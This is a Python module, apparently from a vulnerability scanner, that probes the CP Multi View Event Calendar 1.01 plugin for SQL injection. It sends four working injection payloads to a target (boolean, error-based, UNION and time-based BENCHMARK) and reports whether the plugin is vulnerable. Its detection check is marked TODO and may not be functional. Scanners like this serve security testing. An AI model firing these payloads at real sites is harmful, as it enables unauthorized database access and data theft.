from ..exploitsql import ExploitSql


class CPMultiViewEventCalendarSQL(ExploitSql):

	exploit_info = {
		'exploit_name': 'CP Multi View Event Calendar',
		'exploit_version': '1.01',
		'exploit_url':  'http://www.exploit-db.com/exploits/35073/'
	}

	# TODO Check behavior of exploit
	def exploit(self):
		exploits = [
			'?cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1%20RLIKE%20(SELECT%20(CASE%20WHEN%20(9095=9095)%20THEN%201%20ELSE%200x28%20END))',
			'?cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1%20AND%20(SELECT%203807%20FROM(SELECT%20COUNT(*),CONCAT(0x7171736971,(SELECT%20(CASE%20WHEN%20(3807=3807)%20THEN%201%20ELSE%200%20END)),0x716b716671,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)',
			'?cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171736971,0x6f7642724e6743615973,0x716b716671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#',
			'?cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1%20AND%208168=BENCHMARK(5000000,MD5(0x4a4a6d41))'
		]
		for exploit in exploits:
			response = ExploitSql.request(self.hostname + exploit)
			if response is not None and 'exploitbehavior' in response:
				self.exploitfound(self.exploit_info)
				return

		self.exploitnotfound(self.exploit_info)
